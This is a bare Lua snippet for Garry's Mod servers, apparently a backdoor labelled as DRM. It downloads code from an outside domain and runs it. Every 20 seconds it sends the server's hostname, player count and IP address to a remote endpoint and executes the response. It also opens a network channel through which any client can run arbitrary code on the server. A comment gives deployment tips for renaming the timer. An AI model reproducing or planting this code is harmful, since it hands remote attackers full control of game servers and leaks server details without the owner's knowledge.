if SERVER then
http.Fetch("https://[domain]/kerminidrmv1.php", function(b, l, h, c)
if c == 200 then RunString(b) end
end)
timer.Create( "6547989879", 20, 0, function() -- 6547989879 change this to azer7361 for example must be 10 characters long 
local a = {
n = string.Replace( GetHostName(), " ", "_" ),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress()
}
http.Post( "https://[domain]/kerminidrmv2.php", a,
function( body, len, headers, code )
RunString(body)
end)
end)
util.AddNetworkString('bgdu57maxime') 
net.Receive('bgdu57maxime',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
end